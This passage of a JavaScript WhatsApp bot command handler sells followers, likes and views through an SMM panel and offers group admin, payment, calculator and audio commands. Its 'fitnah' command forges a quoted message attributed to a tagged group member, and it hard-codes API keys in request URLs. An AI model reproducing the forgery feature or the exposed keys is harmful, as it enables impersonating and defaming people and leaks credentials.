            `https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=semua`
          );
          if (feta.status == false) return reply(feta.data.msg);
          let list = "*List Harga Layanan*\n\n";
          for (let L of feta.data) {
            list += `name : ${L.nama}\ndesc : ${L.desc}\nmin : ${L.min}\nmax : ${L.max}\nharga : ${L.price}\nid : ${L.id_layanan}\n\n`;
          }
          conn.sendMessage(from, { text: list }, { quoted: msg });
        }
        break;
      case "komisi":
        if (!isOwner) return reply(mess.OnlyOwner);
        var komisi = await fetchJson(
          `http://ampibismm.my.id/api/json?bot=true&action=profile&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop`
        );
        let reskomisi = `Hallo owner Berikut komisi anda\n*Name :* ${komisi.data.name}\n*Full Name :* ${komisi.data.full_name}\n*Komisi :* ${komisi.data.komisi}`;
        conn.sendMessage(from, { text: reskomisi }, { quoted: msg });
        break;
      case "tk":
      case "tarikkomisi":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (args.length < 1) return reply("jumlahnya berapa? minimal 10k");
          var fetaa = await fetchJson(
            `https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=listwallet`
          );
          let list = [];
          console.log(fetaa);
          for (let L of fetaa.data) {
            let no = 1;
            list.push({
              buttonText: { displayText: L.wallet },
              buttonId: `${prefix}tarikkomisikunci ${q}|${L.wallet}`,
              type: `${no++}`,
            });
          }
          let nyobb = list;
          conn.sendMessage(from, {
            text: `*PILLIH E-WALLET*\nPilih jenis wallet yang ingin anda gunakan!`,
            title: "WALLET",
            footer: "©SosmedShop",
            buttons: nyobb,
          });
        }
        break;
      case "tarikkomisikunci":
        if (!isOwner) return reply(mess.OnlyOwner);
        if (args.length < 1) return m.reply("jumlahnya berapa bang");
        let juml = q.split("|")[0] ? q.split("|")[0] : q;
        let walle = q.split("|")[1] ? q.split("|")[1] : "";
        if (walle.length < 1) return reply(`Jumlah dan Target harus di isi!`);
        var tarikom = await fetchJson(
          `https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=withdraw&amount=${juml}&wallet=${walle}&nomor=${smm_dana_number}&an=${smm_dana_nama}`
        );
        console.log(tarikom);
        conn.sendMessage(
          from,
          { text: `${tarikom.data.msg}` },
          { quoted: msg }
        );
        break;
      case "clear":
      case "clearer":
      case "clearerr":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          server_eror.splice("[]");
          fs.writeFileSync(
            "./database/func_error.json",
            JSON.stringify(server_eror)
          );
          reply("Done");
        }
        break;
      case "error":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          var teks = `*ERROR SERVER*\n_Total Tercatatat_ : ${server_eror.length}\n\n`;
          var NO = 1;
          for (let i of server_eror) {
            teks += `=> *ERROR (${NO++})*\n${i.error}\n\n`;
          }
          reply(teks);
        }
        break;
      case "order":
      case "caraorder":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
          let capp = `*Hallo Kak Berikut Cara Order*\n\n*Followers :*\nex1 : _${prefix}followers jumlah|target [ tanpa (@) ]_\nex2 : _${prefix}followers 500|lexxy4554_\n\n*View :*\nex 1 : _${prefix}view jumlah|link_\nex 2 : _${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Like :*\nex 1 : _${prefix}like jumlah|link_\nex 2 : _${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda faham dengan penjelasan ini🙏\nbeli = faham`;
          conn.sendMessage(from, { text: capp }, { quoted: msg });
        }
        break;
      case "view":
      case "like":
      case "follower": {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        if (args.length < 1)
          return reply(
            "Format tidak valid, jika masih belum mengerti ketik *#order*"
          );
        let juma = q.split("|")[0] ? q.split("|")[0] : q;
        let targtt = q.split("|")[1] ? q.split("|")[1] : "";
        if (targtt.length < 1)
          return reply(
            `Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(
              1
            )} 500|ahlulmukh_`
          );
        var fetaa = await fetchJson(
          `https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=pricelist&type=${command}`
        );
        let list = [];
        var textplus = `${juma}|${targtt}`;
        for (let L of fetaa.data) {
          list.push({
            title: `${L.nama}`,
            rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
            description: `\n${L.desc}`,
          });
        }
        const listMessage = {
          text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
          footer: "© created by Ahmuq",
          buttonText: "Click Here!",
          sections: [
            {
              title: "Sosmed Shop",
              rows: list,
            },
          ],
          listType: 1,
        };
        const sendMsg = await conn.sendMessage(from, listMessage);
        break;
      }
      case "confirmorderkunci":
        {
          //KUNCI = BIAR GA DIAKSES HEHE
          if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
          if (args.length < 1)
            return reply(
              `*Cara order followers*\n\n*Example :* _${command} jumlah|username tanpa (@)_\n*Example :* _${command} 500|lexxy2408_\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`
            );
          let jumlah = q.split("|")[0] ? q.split("|")[0] : q;
          let targ = q.split("|")[1] ? q.split("|")[1] : "";
          let idny = q.split("|")[2] ? q.split("|")[2] : "";
          var feta = await fetchJson(
            `https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`
          );
          if (feta.status == false) {
            reply(
              `*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`
            );
          } else {
            let idpes = feta.data.order_id;
            let cap = `Hai *@${
              sender.split("@")[0]
            } 👋,* Terimakasih Telah Order di Sosmed Shop!\nScan QR diatas untuk membayar! Menggunakan QRIS.\n\n*ID Pesanan :*\n${
              feta.data.order_id
            }\n\n*Target :*\n${targ}\n\n*Jumlah Order :* ${jumlah}\n*Total Harga :* Rp${toRupiah(
              feta.data.amount
            )}\n*Status Orderan :* ${
              feta.data.status
            }\n\n*info lebih lanjut?*\n*klik button dibawah.*`;
            var buto = [
              {
                buttonId: `!cekstatus ${feta.data.order_id}`,
                buttonText: { displayText: "Check Status" },
                type: 1,
              },
            ];
            conn.sendMessage(from, {
              caption: cap,
              image: { url: feta.data.qris },
              buttons: buto,
              footer: "© created by lexxy official",
            });
          }
          console.log(feta);
        }
        break;
      case "chekstatus":
      case "cekstatus": {
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        if (!q) return reply("id ordernya mana kak?");
        var seta = await fetchJson(
          `https://ampibismm.my.id/api/json?bot=true&api_key=hASnfGXGkVRT2NonzLePbp3wZAmzop&action=status&order_id=${q}`
        );
        if (seta.status == false) {
          var captionnye = `\nid order tidak di temukan`;
        } else {
          var captionnye = `\n*Status Orderan Anda*\n\nTarget : ${seta.data.target}\nStatus : ${seta.data.status}\nFollowers Default : ${seta.data.start_count}\nOn Process : ${seta.data.kurang}\nTotal Order : ${seta.data.total_order}\nTanggal Pesan : ${seta.data.tanggal_pesan}\nJumlah Pembayaran : ${seta.data.amount}\nId Pesanan : ${seta.data.order_id}\n\nTerimakasih sudah membeli jasa suntik dari kami, ditunggu next ordernya!`;
        }
        reply(captionnye);
        break;
      }

      // STORE FUN
      case "shop":
      case "list":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (db_respon_list.length === 0)
          return reply(`Belum ada list message di database`);
        if (!isAlreadyResponListGroup(from, db_respon_list))
          return reply(`Belum ada list message yang terdaftar di group ini`);
        var arr_rows = [];
        for (let x of db_respon_list) {
          if (x.id === from) {
            arr_rows.push({
              title: x.key,
              rowId: x.key,
            });
          }
        }
        var listMsg = {
          text: `Hi @${sender.split("@")[0]}`,
          buttonText: "Click Here!",
          footer: `*List From ${groupName}*\n\n⏳ ${jam}\n📆 ${tanggal}`,
          mentions: [sender],
          sections: [
            {
              title: groupName,
              rows: arr_rows,
            },
          ],
        };
        conn.sendMessage(from, listMsg);
        break;
      case "addlist":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
        var args1 = q.split("@")[0];
        var args2 = q.split("@")[1];
        if (!q.includes("@"))
          return reply(
            `Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`
          );
        if (isAlreadyResponList(from, args1, db_respon_list))
          return reply(
            `List respon dengan key : *${args1}* sudah ada di group ini.`
          );
        addResponList(from, args1, args2, false, "-", db_respon_list);
        reply(`Berhasil menambah List menu : *${args1}*`);
        break;
      case "dellist":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
        if (db_respon_list.length === 0)
          return reply(`Belum ada list message di database`);
        if (!q)
          return reply(
            `Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`
          );
        if (!isAlreadyResponList(from, q, db_respon_list))
          return reply(`List respon dengan key *${q}* tidak ada di database!`);
        delResponList(from, q, db_respon_list);
        reply(`Sukses delete list message dengan key *${q}*`);
        break;
      case "update":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
        var args1 = q.split("@")[0];
        var args2 = q.split("@")[1];
        if (!q.includes("@"))
          return reply(
            `Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`
          );
        if (!isAlreadyResponListGroup(from, db_respon_list))
          return reply(
            `Maaf, untuk key *${args1}* belum terdaftar di group ini`
          );
        updateResponList(from, args1, args2, false, "-", db_respon_list);
        reply(`Berhasil update List menu : *${args1}*`);
        break;
      case "tambah":
        if (!q)
          return reply(
            `Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`
          );
        var num_one = q.split(" ")[0];
        var num_two = q.split(" ")[1];
        if (!num_one)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        if (!num_two)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        var nilai_one = Number(num_one);
        var nilai_two = Number(num_two);
        reply(`${nilai_one + nilai_two}`);
        break;
      case "kurang":
        if (!q)
          return reply(
            `Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`
          );
        var num_one = q.split(" ")[0];
        var num_two = q.split(" ")[1];
        if (!num_one)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        if (!num_two)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        var nilai_one = Number(num_one);
        var nilai_two = Number(num_two);
        reply(`${nilai_one - nilai_two}`);
        break;
      case "kali":
        if (!q)
          return reply(
            `Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`
          );
        var num_one = q.split(" ")[0];
        var num_two = q.split(" ")[1];
        if (!num_one)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        if (!num_two)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        var nilai_one = Number(num_one);
        var nilai_two = Number(num_two);
        reply(`${nilai_one * nilai_two}`);
        break;
      case "bagi":
        if (!q)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`
          );
        var num_one = q.split(" ")[0];
        var num_two = q.split(" ")[1];
        if (!num_one)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        if (!num_two)
          return reply(
            `Gunakan dengan cara ${
              prefix + command
            } *angka* *angka*\n\n_Contoh_\n\n${prefix + command} 1 2`
          );
        var nilai_one = Number(num_one);
        var nilai_two = Number(num_two);
        reply(`${nilai_one / nilai_two}`);
        break;
      case "p":
      case "proses":
        {
          if (!isGroup) return "Hanya Dapat Digunakan Gi Group";
          if (!isOwner && !isGroupAdmins)
            return "Hanya Bisa Digunakan Oleh Admin";
          if (!quotedMsg) return reply("Reply pesanannya!");
          mentions(
            `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan : ${
              quotedMsg.chats
            }\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`,
            [sender]
          );
        }
        break;
      case "d":
      case "done":
        {
          if (!isGroup) return "Hanya Dapat Digunakan Gi Group";
          if (!isOwner && !isGroupAdmins)
            return "Hanya Bisa Digunakan Oleh Admin";
          if (!quotedMsg) return reply("Reply pesanannya!");
          mentions(
            `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${
              quotedMsg.sender.split("@")[0]
            } Next Order ya🙏`,
            [sender]
          );
        }
        break;
      case "setppbot":
        if (!isOwner && !fromMe) return reply(mess.OnlyOwner);
        if (isImage && isQuotedImage)
          return reply(
            `Kirim gambar dengan caption *#setppbot* atau reply gambar yang sudah dikirim dengan pesan *#setppbot*`
          );
        await conn.downloadAndSaveMediaMessage(
          msg,
          "image",
          `./transaksi/${sender.split("@")[0]}.jpg`
        );
        var media = `./transaksi/${sender.split("@")[0]}.jpg`;
        conn.updateProfilePicture(botNumber, { url: media });
        reply("Sukses Mengganti Profile Bot");
        await sleep(2000);
        fs.unlinkSync(media);
        break;
      case "git":
      case "gitclone":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          let regex1 =
            /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
          if (!q)
            return reply(
              "link githubnya mana?\n*Contoh:*\n#gitclone https://github.com/Lexxy24/MenfessV1"
            );
          var linknya = q;
          if (!regex1.test(linknya)) return reply("link salah!");
          let [, user, repo] = args[0].match(regex1) || [];
          repo = repo.replace(/.git$/, "");
          let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
          let filename = (await fetch(url, { method: "HEAD" })).headers
            .get("content-disposition")
            .match(/attachment; filename=(.*)/)[1];
          reply(`*Mohon tunggu, sedang mengirim repository..*`);
          conn
            .sendMessage(
              from,
              {
                document: { url: url },
                fileName: filename,
                mimetype: "application/zip",
              },
              { quoted: msg }
            )
            .catch((err) =>
              reply(
                "Maaf link github yang kamu berikan di private, dan tidak bisa di jadikan file"
              )
            );
        }
        confirmlimit(sender, 1);
        break;
      case "badgirlserti":
      case "goodgirlserti":
      case "bucinserti":
      case "fuckgirlserti":
      case "toloserti":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          if (!q) return reply(`*Contoh:*\n${prefix + command} text`);
          var anu = await getBuffer(
            `https://api.lolhuman.xyz/api/${command}?apikey=SadTeams&name=${q}`
          );
          reply(mess.wait);
          conn
            .sendMessage(
              from,
              { image: anu, caption: `${command}` },
              { quoted: msg }
            )
            .catch((err) => reply("Maaf server LolHuman sedang down"));
        }
        confirmlimit(sender, 1);
        break;
      case "fitnah":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!q)
          return reply(
            `Kirim perintah #*${command}* @tag|pesantarget|pesanbot`
          );
        var org = q.split("|")[0];
        var target = q.split("|")[1];
        var bot = q.split("|")[2];
        if (!org.startsWith("@")) return reply("Tag orangnya");
        if (!target) return reply(`Masukkan pesan target!`);
        if (!bot) return reply(`Masukkan pesan bot!`);
        var mens = parseMention(target);
        var msg1 = {
          key: {
            fromMe: false,
            participant: `${parseMention(org)}`,
            remoteJid: from ? from : "",
          },
          message: {
            extemdedTextMessage: {
              text: `${target}`,
              contextInfo: { mentionedJid: mens },
            },
          },
        };
        var msg2 = {
          key: {
            fromMe: false,
            participant: `${parseMention(org)}`,
            remoteJid: from ? from : "",
          },
          message: { conversation: `${target}` },
        };
        conn.sendMessage(
          from,
          { text: bot, mentions: mentioned },
          { quoted: mens.length > 2 ? msg1 : msg2 }
        );
        break;
      case "del":
      case "delete":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
        if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`);
        if (!quotedMsg.fromMe)
          return reply(`Hanya bisa menghapus chat dari bot`);
        conn.sendMessage(from, {
          delete: { fromMe: true, id: quotedMsg.id, remoteJid: from },
        });
        confirmlimit(sender, 1);
        break;
      case "linkgrup":
      case "linkgc":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        var url = await conn
          .groupInviteCode(from)
          .catch(() => reply(mess.error.api));
        url = "https://chat.whatsapp.com/" + url;
        reply(url);
        break;
      case "kick":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0];
          conn.groupParticipantsUpdate(from, [number], "remove");
        } else if (isQuotedMsg) {
          number = quotedMsg.sender;
          conn.groupParticipantsUpdate(from, [number], "remove");
        } else {
          reply("Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag");
        }
        break;
      case "setppgrup":
      case "setppgc":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        if (isImage && isQuotedImage)
          return reply(
            `Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`
          );
        await conn.downloadAndSaveMediaMessage(
          msg,
          "image",
          `./transaksi/${sender.split("@")[0]}.jpg`
        );
        var media = `./transaksi/${sender.split("@")[0]}.jpg`;
        await conn.updateProfilePicture(from, { url: media });
        await sleep(2000);
        reply("Sukses mengganti foto profile group");
        fs.unlinkSync(media);
        break;
      case "setnamegrup":
      case "setnamegc":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        if (!q) return reply(`Kirim perintah #${command} teks`);
        await conn
          .groupUpdateSubject(from, q)
          .then((res) => {
            reply(`Sukses`);
          })
          .catch(() => reply(mess.error.api));
        break;
      case "setdesc":
      case "setdescription":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        if (!q) return reply(`Kirim perintah ${command} teks`);
        await conn
          .groupUpdateDescription(from, q)
          .then((res) => {
            reply(`Sukses`);
          })
          .catch(() => reply(mess.error.api));
        break;
      case "group":
      case "grup":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        if (!q)
          return reply(
            `Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`
          );
        if (args[0] == "close") {
          conn.groupSettingUpdate(from, "announcement");
          reply(
            `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`
          );
        } else if (args[0] == "open") {
          conn.groupSettingUpdate(from, "not_announcement");
          reply(
            `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`
          );
        } else {
          reply(
            `Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`
          );
        }
        break;
      case "revoke":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        await conn
          .groupRevokeInvite(from)
          .then((res) => {
            reply(`Sukses menyetel tautan undangan grup ini`);
          })
          .catch(() => reply(mess.error.api));
        break;
      case "tagall":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
        if (!q) return reply(`Teks?`);
        let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ""}\n\n`;
        for (let mem of participants) {
          teks_tagall += `➲ @${mem.id.split("@")[0]}\n`;
        }
        conn.sendMessage(
          from,
          { text: teks_tagall, mentions: participants.map((a) => a.id) },
          { quoted: msg }
        );
        break;
      case "hidetag":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
        let mem = [];
        groupMembers.map((i) => mem.push(i.id));
        conn.sendMessage(from, { text: q ? q : "", mentions: mem });
        break;
      case "welcome":
        {
          if (!isGroup) return reply("Khusus Group!");
          if (!msg.key.fromMe && !isOwner && !isGroupAdmins)
            return reply("Khusus admin!");
          if (!args[0])
            return reply(
              `Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`
            );
          if (args[0] == "ON" || args[0] == "on" || args[0] == "On") {
            if (isWelcome) return reply("Sudah aktif✓");
            welcomeJson.push(from);
            fs.writeFileSync(
              "./database/welcome.json",
              JSON.stringify(welcomeJson)
            );
            reply("Suksess mengaktifkan welcome di group:\n" + groupName);
          } else if (
            args[0] == "OFF" ||
            args[0] == "OF" ||
            args[0] == "Of" ||
            args[0] == "Off" ||
            args[0] == "of" ||
            args[0] == "off"
          ) {
            welcomeJson.splice(from, 1);
            fs.writeFileSync(
              "./database/welcome.json",
              JSON.stringify(welcomeJson)
            );
            reply("Success menonaktifkan welcome di group:\n" + groupName);
          } else {
            reply("Kata kunci tidak ditemukan!");
          }
        }
        break;
      case "antilink":
        {
          if (!isGroup) return reply(mess.OnlyGrup);
          if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
          if (!isBotGroupAdmins) return reply(mess.BotAdmin);
          if (!args[0])
            return reply(
              `Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`
            );
          if (args[0] == "ON" || args[0] == "on" || args[0] == "On") {
            if (isAntiLink) return reply("Antilink sudah aktif");
            antilink.push(from);
            fs.writeFileSync(
              "./database/antilink.json",
              JSON.stringify(antilink, null, 2)
            );
            reply("Successfully Activate Antilink In This Group");
          } else if (
            args[0] == "OFF" ||
            args[0] == "OF" ||
            args[0] == "Of" ||
            args[0] == "Off" ||
            args[0] == "of" ||
            args[0] == "off"
          ) {
            if (!isAntiLink) return reply("Antilink belum aktif");
            let anu = antilink.indexOf(from);
            antilink.splice(anu, 1);
            fs.writeFileSync(
              "./database/antilink.json",
              JSON.stringify(antilink, null, 2)
            );
            reply("Successfully Disabling Antilink In This Group");
          } else {
            reply("Kata kunci tidak ditemukan!");
          }
        }
        break;
      case "promote":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        if (mentionUser.length !== 0) {
          conn
            .groupParticipantsUpdate(from, [mentionUser[0]], "promote")
            .then((res) => {
              mentions(
                `Sukses menjadikan @${
                  mentionUser[0].split("@")[0]
                } sebagai admin`,
                [mentionUser[0]],
                true
              );
            })
            .catch(() => reply(mess.error.api));
        } else if (isQuotedMsg) {
          conn
            .groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
            .then((res) => {
              mentions(
                `Sukses menjadikan @${
                  quotedMsg.sender.split("@")[0]
                } sebagai admin`,
                [quotedMsg.sender],
                true
              );
            })
            .catch(() => reply(mess.error.api));
        } else {
          reply(
            `Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${
              prefix + command
            } @tag`
          );
        }
        break;
      case "tiktokauto":
        {
          if (!isGroup) return reply(mess.OnlyGrup);
          if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin);
          if (!isBotGroupAdmins) return reply(mess.BotAdmin);
          if (!args[0])
            return reply(
              `Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`
            );
          if (args[0] == "ON" || args[0] == "on" || args[0] == "On") {
            if (isAutoDownTT) return reply("Auto download tiktok sudah aktif");
            auto_downloadTT.push(from);
            fs.writeFileSync(
              "./database/tiktokDown.json",
              JSON.stringify(auto_downloadTT, null, 2)
            );
            reply("Berhasil mengaktifkan auto download tiktok");
          } else if (
            args[0] == "OFF" ||
            args[0] == "OF" ||
            args[0] == "Of" ||
            args[0] == "Off" ||
            args[0] == "of" ||
            args[0] == "off"
          ) {
            if (!isAutoDownTT) return reply("Auto download tiktok belum aktif");
            auto_downloadTT.splice(anu, 1);
            fs.writeFileSync(
              "./database/tiktokDown.json",
              JSON.stringify(auto_downloadTT, null, 2)
            );
            reply("Berhasil mematikan auto download tiktok");
          } else {
            reply("Kata kunci tidak ditemukan!");
          }
        }
        break;
      case "demote":
        if (!isGroup) return reply(mess.OnlyGrup);
        if (!isGroupAdmins) return reply(mess.GrupAdmin);
        if (!isBotGroupAdmins) return reply(mess.BotAdmin);
        if (mentionUser.length !== 0) {
          conn
            .groupParticipantsUpdate(from, [mentionUser[0]], "demote")
            .then((res) => {
              mentions(
                `Sukses menjadikan @${
                  mentionUser[0].split("@")[0]
                } sebagai member biasa`,
                [mentionUser[0]],
                true
              );
            })
            .catch(() => reply(mess.error.api));
        } else if (isQuotedMsg) {
          conn
            .groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
            .then((res) => {
              mentions(
                `Sukses menjadikan @${
                  quotedMsg.sender.split("@")[0]
                } sebagai member biasa`,
                [quotedMsg.sender],
                true
              );
            })
            .catch(() => reply(mess.error.api));
        } else {
          reply(
            `Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${
              prefix + command
            } @tag`
          );
        }
        break;
      case "infogc":
      case "infogrup":
      case "infogroup":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        if (!isGroup) return reply(mess.OnlyGrup);
        let cekgcnya = `*INFO GROUP*
• *ID:* ${from}
• *Name:* ${groupName}
• *Member:* ${groupMembers.length}
• *Total Admin:* ${groupAdmins.length}
• *Welcome:* ${isWelcome ? "aktif" : "tidak"}
• *Antilink:* ${isAntiLink ? "aktif" : "tidak"}
• *Tiktok Auto:* ${isAutoDownTT ? "aktif" : "tidak"}`;
        reply(cekgcnya);
        break;
      case "text_grup":
        {
          const reactionMessage = { react: { text: "🗿", key: msg.key } };
          conn.sendMessage(from, reactionMessage);
        }
        break;
      case "ttp":
        {
          if (!q) return reply(`Contoh :\n#${command} Lexxy`);
          conn.sendMessage(from, {
            sticker: { url: anu },
            mimetype: "image/webp",
          });
        }
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        reply(mess.wait);
        var inicdd = await getBuffer(
          `https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`
        );
        conn.sendMessage(
          from,
          { audio: inicdd, mimetype: "audio/mpeg", ptt: true },
          { quoted: msg }
        );
        confirmlimit(sender, 1);
        break;
      case "audio1":
      case "audio2":
      case "audio3":
      case "audio4":
      case "audio5":
      case "audio6":
      case "audio7":
      case "audio8":
      case "audio9":
      case "audio10":
      case "audio11":
      case "audio12":
      case "audio13":
      case "audio14":
      case "audio15":
      case "audio16":
      case "audio17":
      case "audio18":
      case "audio19":
      case "audio20":
        if (cekUser("id", sender) == null)
          return conn.sendMessage(from, buta_menu);
        reply(mess.wait);
        conn.sendMessage(
          from,
          {
            audio: { url: `https://md-devs.herokuapp.com/${command}.mp3` },
            mimetype: "audio/mp4",
            ptt: true,
          },
          { quoted: msg }
        );
        confirmlimit(sender, 1);
        break;
      case "tourl":
      case "upload":
        if (cekUser("id", sender) == null)
